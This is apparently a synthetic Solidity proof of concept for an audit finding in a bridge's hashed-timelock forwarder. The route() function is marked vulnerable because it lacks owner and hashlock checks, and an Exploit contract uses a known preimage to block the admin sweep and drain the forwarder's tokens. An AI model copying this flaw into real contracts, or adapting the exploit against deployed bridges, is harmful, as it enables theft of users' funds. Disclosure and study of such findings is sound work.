// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  SatsBridge — permissionless ForwarderHashedTimelockERC20.route (Cantina, 46080)
    SYNTHETIC, cheatcode-free reduction.
    Root cause: route() has no owner check, no timelock cap, and no hashlock check.
    An attacker routes the forwarder's service tokens to themselves with a preimage
    they already know, blocks the admin sweep, and settle() pays them. (@> VULN). */

contract ERC20 {
    string public name = "Bob Token";
    string public symbol = "BOB";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 a) external { balanceOf[to] += a; }

    function transfer(address to, uint256 a) external returns (bool) {
        require(balanceOf[msg.sender] >= a, "bal");
        balanceOf[msg.sender] -= a;
        balanceOf[to] += a;
        return true;
    }
}

contract ForwarderHashedTimelockERC20 {
    enum State { Init, Routed, Settled }

    State public state;
    address public owner;
    address public counterparty;
    bool public incoming;
    bytes32 public hashlock;
    uint256 public timelock;
    address public token;
    uint256 public amount;

    constructor(address _owner) { owner = _owner; }

    function route(address _counterparty, bool _incoming, bytes32 _hashlock, uint256 _timelock, address _token, uint256 _amount) external {
        require(state == State.Init, "init");
        counterparty = _counterparty; // @> VULN: any caller can bind the forwarder's tokens
        // FIX: require(msg.sender == owner) for outgoing routes, and require(_timelock <= block.timestamp + 2 days)
        incoming = _incoming;
        hashlock = _hashlock;
        timelock = _timelock; // STORY3 no upper bound
        token = _token;
        amount = _amount;
        state = State.Routed;
    }

    function transfer(address _token, address to, uint256 _amount) external {
        require(msg.sender == owner, "owner");
        require(state == State.Init, "not initial"); // STORY5 admin sweep reverts once a route exists
        require(ERC20(_token).transfer(to, _amount), "sweep");
    }

    function settle(bytes32 preimage) external {
        require(state == State.Routed, "state");
        require(sha256(abi.encodePacked(preimage)) == hashlock, "hash");
        require(ERC20(token).transfer(counterparty, amount), "pay"); // STORY6
        state = State.Settled;
    }
}

contract Admin {
    function sweep(ForwarderHashedTimelockERC20 f, address token, address to, uint256 amt) external {
        f.transfer(token, to, amt); // STORY4
    }
}

contract Exploit {
    ERC20 public token; // nonce 1
    Admin public admin; // nonce 2
    ForwarderHashedTimelockERC20 public forwarder; // nonce 3
    bool public adminBlocked;
    uint256 public constant AMOUNT = 100 ether;

    constructor() {
        token = new ERC20();
        admin = new Admin();
        forwarder = new ForwarderHashedTimelockERC20(address(admin));
        token.mint(address(forwarder), AMOUNT);
    }

    function run() external {
        bytes32 preimage = keccak256("malicious-preimage");
        bytes32 lock = sha256(abi.encodePacked(preimage));
        forwarder.route(address(this), false, lock, type(uint256).max, address(token), AMOUNT); // STORY1
        try admin.sweep(forwarder, address(token), address(admin), AMOUNT) {
            adminBlocked = false;
        } catch {
            adminBlocked = true; // STORY2
        }
        require(adminBlocked, "admin swept");
        forwarder.settle(preimage);
        require(token.balanceOf(address(forwarder)) == 0, "still there");
        require(token.balanceOf(address(this)) == AMOUNT, "stolen");
        require(forwarder.timelock() == type(uint256).max, "timelock");
    }
}
